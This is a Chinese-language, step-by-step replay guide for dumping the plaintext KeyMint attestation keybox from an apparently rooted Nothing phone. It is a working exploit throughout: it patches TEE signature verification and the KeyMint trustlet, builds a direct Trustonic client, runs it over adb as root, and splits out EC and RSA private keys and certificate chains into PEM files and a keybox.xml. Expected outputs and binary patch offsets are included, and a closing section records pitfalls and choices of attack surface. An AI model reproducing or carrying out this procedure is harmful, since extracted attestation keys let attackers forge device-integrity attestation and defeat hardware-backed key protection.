# KeyMint Attestation Keybox 全流程重放复现文档

项目根目录：`<PROJECT_ROOT>`

本文用于从当前项目状态快速重放，复现从 patched KeyMint TA 到明文 keybox 的完整路径。

## 0. 重放范围

本文默认设备已经处于以下状态：

```text
Bootloader unlocked
lk_a = <PROJECT_ROOT>/pacman-fenrir-minimal.bin 已验证
tee_a = <PROJECT_ROOT>/tee-patched-A-only.img 已验证
Magisk root 可用
Android 系统正常启动
TEE/KeyMint/keystore2 正常运行
```

本文不重新刷设备，只重放：

1. 本地生成 patched KeyMint TA。
2. 构建 direct Trustonic client。
3. 在设备上加载 patched TA。
4. 导出 patched 后的 mapped buffer。
5. 拆分明文 keybox。
6. 验证私钥与证书链。

## 1. 检查设备健康

```bash
cd "<PROJECT_ROOT>"

adb devices -l
adb shell 'for p in ro.product.model ro.product.device ro.hardware ro.build.display.id ro.build.version.release ro.boot.slot_suffix ro.boot.verifiedbootstate init.svc.tee-1-1 init.svc.keystore2; do echo "$p=$(getprop $p)"; done'
adb shell 'id; command -v su; su -c id'
adb shell 'service list | grep -Ei "keymint|provision|rkp|keystore"'
adb shell 'ps -A | grep -Ei "keymint|rkpd|keystore|tee"'
```

成功判据：

```text
<DEVICE_SERIAL> device
ro.product.device=Pacman
ro.hardware=mt6886
ro.boot.slot_suffix=_a
ro.boot.verifiedbootstate=orange
init.svc.tee-1-1=running
init.svc.keystore2=running
su -c id -> uid=0(root)
```

## 2. 确认输入文件存在

```bash
cd "<PROJECT_ROOT>"

ls -l \
  device_dump/vendor_app_mcRegistry/0706000000000000000000000000004d.tlbin \
  device_dump/persist/attest_keybox.so \
  device_dump/persist/attestation_ids.so \
  device_dump/vendor_lib64/libMcClient.so \
  analysis/patch_0706_dump.py \
  analysis/extract_keybox_plain.py \
  keymint_tee_client/kmtee_probe.c
```

校验哈希：

```bash
shasum -a 256 \
  device_dump/vendor_app_mcRegistry/0706000000000000000000000000004d.tlbin \
  device_dump/persist/attest_keybox.so \
  device_dump/persist/attestation_ids.so
```

期望：

```text
ad17a40a49cc0c812f78359a72d5d5c73b54eabac261f861db6d1f72b3b745b2  device_dump/vendor_app_mcRegistry/0706000000000000000000000000004d.tlbin
64fa3546cb36ae14c0388ee7fa1d5619251b26521f21ede56970beea73386f69  device_dump/persist/attest_keybox.so
5c8a419d3110f38256c0146af5e25e6a5f21e56a3b7ecc70e35fbe2889095c74  device_dump/persist/attestation_ids.so
```

## 3. 生成 patched KeyMint TA

```bash
cd "<PROJECT_ROOT>"
python3 analysis/patch_0706_dump.py
shasum -a 256 patched_ta/0706000000000000000000000000004d.dumpkeybox.tlbin
```

成功判据：

```text
92d66968007e462f1c56c7aaee4ca4d5deb4da8822ba396035001d72f67b1016  patched_ta/0706000000000000000000000000004d.dumpkeybox.tlbin
```

## 4. 构建 Trustonic direct client

```bash
cd "<PROJECT_ROOT>"

NDK=<HOST_SDK>/ndk/25.2.9519653/toolchains/llvm/prebuilt/darwin-x86_64

$NDK/bin/aarch64-linux-android33-clang -Wall -Wextra -O2 \
  keymint_tee_client/kmtee_probe.c \
  -o keymint_tee_client/kmtee_probe \
  -Ldevice_dump/vendor_lib64 -lMcClient -Wl,-rpath,/vendor/lib64

file keymint_tee_client/kmtee_probe
$NDK/bin/llvm-readelf -d keymint_tee_client/kmtee_probe | grep -E 'NEEDED|RUNPATH'
```

成功判据：

```text
ELF 64-bit LSB pie executable, ARM aarch64
RUNPATH [/vendor/lib64]
NEEDED libMcClient.so
```

## 5. 推送并运行 patched TA probe

```bash
cd "<PROJECT_ROOT>"

adb push keymint_tee_client/kmtee_probe /data/local/tmp/kmtee_probe
adb push patched_ta/0706000000000000000000000000004d.dumpkeybox.tlbin /data/local/tmp/0706000000000000000000000000004d.dumpkeybox.tlbin

adb shell 'su -c "chmod 755 /data/local/tmp/kmtee_probe && LD_LIBRARY_PATH=/vendor/lib64:/system_ext/lib64 /data/local/tmp/kmtee_probe /data/local/tmp/0706000000000000000000000000004d.dumpkeybox.tlbin"'
```

成功输出应包含：

```text
tl_path=/data/local/tmp/0706000000000000000000000000004d.dumpkeybox.tlbin
tl=281651 keybox=8716 ids=892
mcOpenDevice ret=0x0
mcOpenTrustlet ret=0x0 sessionId=0x1101 deviceId=0x0
[attest_keybox] mcMap ret=0x0
[attest_keybox] mcWait ret=0x0 tci_ret=0x0
[attestation_ids] mcMap ret=0x0
[attestation_ids] mcWait ret=0x0 tci_ret=0x0
close cmd ret=0x0 tci_ret=0x0
DONE rc1=0 rc2=0
```

## 6. 拉回 probe 输出

```bash
cd "<PROJECT_ROOT>"

rm -rf keymint_tee_client/out_patched
mkdir -p keymint_tee_client/out_patched
adb exec-out su -c 'cd /data/local/tmp/kmtee_out && tar -cf - .' | tar -C keymint_tee_client/out_patched -xf -

find keymint_tee_client/out_patched -maxdepth 1 -type f -print -exec shasum -a 256 {} \;
```

关键文件：

```text
keymint_tee_client/out_patched/attest_keybox_before.bin
keymint_tee_client/out_patched/attest_keybox_buf_after.bin
keymint_tee_client/out_patched/attest_keybox_tci.bin
keymint_tee_client/out_patched/attestation_ids_before.bin
keymint_tee_client/out_patched/attestation_ids_buf_after.bin
keymint_tee_client/out_patched/attestation_ids_tci.bin
keymint_tee_client/out_patched/close_tci.bin
```

成功判据：

```bash
cmp -l keymint_tee_client/out_patched/attest_keybox_before.bin keymint_tee_client/out_patched/attest_keybox_buf_after.bin | head
xxd -g1 -l 64 keymint_tee_client/out_patched/attest_keybox_buf_after.bin
```

应看到 `attest_keybox_buf_after.bin` 与 before 不同，并以明文结构开始：

```text
01 00 00 00 8a 00 00 00 30 81 87 02 01 00 30 13 ...
```

## 7. 拆分明文 keybox

```bash
cd "<PROJECT_ROOT>"

python3 analysis/extract_keybox_plain.py
```

成功输出：

```text
version_or_keybox_number=1
ec_private_key.der len=138
ec_cert_count=3
ec_cert_0.der len=503
ec_cert_1.der len=920
ec_cert_2.der len=1312
rsa_private_key.der len=1794
rsa_cert_count=3
rsa_cert_0.der len=1252
rsa_cert_1.der len=1349
rsa_cert_2.der len=1312
plaintext_len=8624
tail_unmodified_len=92
```

## 8. 生成 PEM / chain 文件

```bash
cd "<PROJECT_ROOT>"

for alg in ec rsa; do
  openssl pkey -inform DER -in extracted_keybox/${alg}_private_key.der -out extracted_keybox/${alg}_private_key.pem
  for i in 0 1 2; do
    openssl x509 -inform DER -in extracted_keybox/${alg}_cert_${i}.der -out extracted_keybox/${alg}_cert_${i}.pem
  done
  cat extracted_keybox/${alg}_cert_0.pem extracted_keybox/${alg}_cert_1.pem extracted_keybox/${alg}_cert_2.pem > extracted_keybox/${alg}_cert_chain.pem
done
```

## 9. 验证私钥与证书链

### 9.1 私钥公钥与 leaf cert 公钥一致

```bash
cd "<PROJECT_ROOT>"

for alg in ec rsa; do
  echo "== $alg private pub =="
  openssl pkey -in extracted_keybox/${alg}_private_key.pem -pubout -outform DER | shasum -a 256
  echo "== $alg leaf pub =="
  openssl x509 -inform DER -in extracted_keybox/${alg}_cert_0.der -pubkey -noout | openssl pkey -pubin -outform DER | shasum -a 256
done
```

期望：

```text
EC:  11c57706dc0ec55c912de361742c7b5527a404ce6ed8fd32be8b6facc8b81b90
RSA: f950a598e25c83a1f4025225b4100e47b2dc9078a7d3f2dd3606882f07f00a2f
```

### 9.2 证书链 verify

```bash
openssl verify -CAfile extracted_keybox/ec_cert_2.pem  -untrusted extracted_keybox/ec_cert_1.pem  extracted_keybox/ec_cert_0.pem
openssl verify -CAfile extracted_keybox/rsa_cert_2.pem -untrusted extracted_keybox/rsa_cert_1.pem extracted_keybox/rsa_cert_0.pem
```

期望：

```text
extracted_keybox/ec_cert_0.pem: OK
extracted_keybox/rsa_cert_0.pem: OK
```

### 9.3 私钥签名与 cert0 公钥验签

```bash
echo test-message > extracted_keybox/sign_test.txt

for alg in ec rsa; do
  openssl dgst -sha256 -sign extracted_keybox/${alg}_private_key.pem -out extracted_keybox/${alg}_sig.bin extracted_keybox/sign_test.txt
  openssl dgst -sha256 -verify <(openssl x509 -in extracted_keybox/${alg}_cert_0.pem -pubkey -noout) -signature extracted_keybox/${alg}_sig.bin extracted_keybox/sign_test.txt
done
```

期望：

```text
Verified OK
Verified OK
```

## 10. 生成 keybox XML

当前项目已经生成：

```text
<PROJECT_ROOT>/extracted_keybox/keybox.xml
sha256=665b36bc8469e259aaaffe77069460f5dd3e3a74ac9cfa7a132163c8f95b8658
```

如果需要重新生成，可用当前已拆出的 PEM 拼接 XML，结构为：

```xml
<AndroidAttestation>
  <NumberOfKeyboxes>1</NumberOfKeyboxes>
  <Keybox DeviceID="<DEVICE_SERIAL>_Nothing_Pacman_A142">
    <Key algorithm="ecdsa">...</Key>
    <Key algorithm="rsa">...</Key>
  </Keybox>
</AndroidAttestation>
```

## 11. 复现完成判据

复现完成时应存在：

```text
<PROJECT_ROOT>/extracted_keybox/attestation_keybox_plain.bin
<PROJECT_ROOT>/extracted_keybox/ec_private_key.pem
<PROJECT_ROOT>/extracted_keybox/rsa_private_key.pem
<PROJECT_ROOT>/extracted_keybox/ec_cert_chain.pem
<PROJECT_ROOT>/extracted_keybox/rsa_cert_chain.pem
<PROJECT_ROOT>/extracted_keybox/keybox.xml
```

并通过：

```text
EC/RSA private pub hash == cert0 pub hash
EC/RSA openssl verify OK
EC/RSA sign verify OK
```

---

# 避坑、问题记录、踩坑记录与解决办法

## 坑 1：Widevine 与 Keystore keybox 混淆

现象：围绕 `MediaDrm`、`WVCdm`、`e97c270e` 做触发，只能看到 DRM 服务启动。

原因：Widevine keybox 是 DRM 体系；Keystore attestation keybox 是 KeyMint / AndroidKeyStore 体系。

解决：改走 KeyMint HAL 与 `/vendor/app/mcRegistry/0706000000000000000000000000004d.tlbin`。

## 坑 2：把 `0717...drbin` 当主目标

现象：早期把 `/vendor/app/mcRegistry/07170000000000000000000000000000.drbin` 当 KeyMint 主目标。

原因：该文件是 Trustonic driver/相关组件，不是实际处理 attestation keybox 的 KeyMint trustlet。

解决：以设备实际 dump 为准，定位 `0706000000000000000000000000004d.tlbin`；其字符串包含 `KEYMINT`、`decrypt_keybox`、`verify_keybox`。

## 坑 3：混刷 U2.6 TEE 到 U2.5 系统

现象：系统进 recovery / Can't load Android system。

原因：TEE 内嵌驱动与系统 vendor / trustlet 版本不匹配。

解决：回到 U2.5 体系，使用 `tee-patched-A-only.img`，并保持单变量测试。

## 坑 4：t-base patch 一次打 A+B

现象：早期 A+B patch 可能导致无法启动。

原因：白名单跳转 patch 破坏了必要逻辑。

解决：只保留 verifySignature 恒返回 0 的 A-only patch。

## 坑 5：试图替换 `/vendor/app/mcRegistry` 文件

现象：替换系统 TA 需要处理只读分区、服务重启、SELinux、bind mount 等额外变量。

解决：不替换系统文件。用 direct client `mcOpenTrustlet()` 从 `/data/local/tmp` 加载 patched TA。

## 坑 6：没有 patched TEE 时加载 patched TA

现象：modified TA 无法加载。

原因：Trustonic t-base 会验证 MCLF 签名。

解决：先确认 `tee-patched-A-only.img` 已刷入且系统健康。

## 坑 7：RKP 判断误导

现象：设备有 `IRemotelyProvisionedComponent/default` 与 `rkpdapp`，容易误判不能提取本地 keybox。

原因：设备支持 RKP 不等于当前 attestation 一定全程 RKP；本机 RKP 失败后会 fallback 到本地 TEE factory chain。

解决：用 `keymint_trigger` 实际触发证书链；观察 chain length 与 cert issuer，再决定攻击面。

## 坑 8：原始 unpatched TA 不会把明文写回 mapped buffer

现象：direct client 发送 `0x00050202` 成功，但 before/after buffer 完全一致。

原因：TA 只在 secure world 内部解析 keybox，不向 normal world 输出明文。

解决：patch `0x1df3c` 和 `0x1e4d4`，把 plaintext 经 heap buffer 写回 mapped buffer。

## 坑 9：文档/路径不统一

现象：`tas/`、`persist_dump/`、`device_dump/` 里有不同来源版本，容易拿错。

解决：本次最终复现全部以 `device_dump/` 下真实设备文件为准；所有 replay 命令从项目根目录执行。
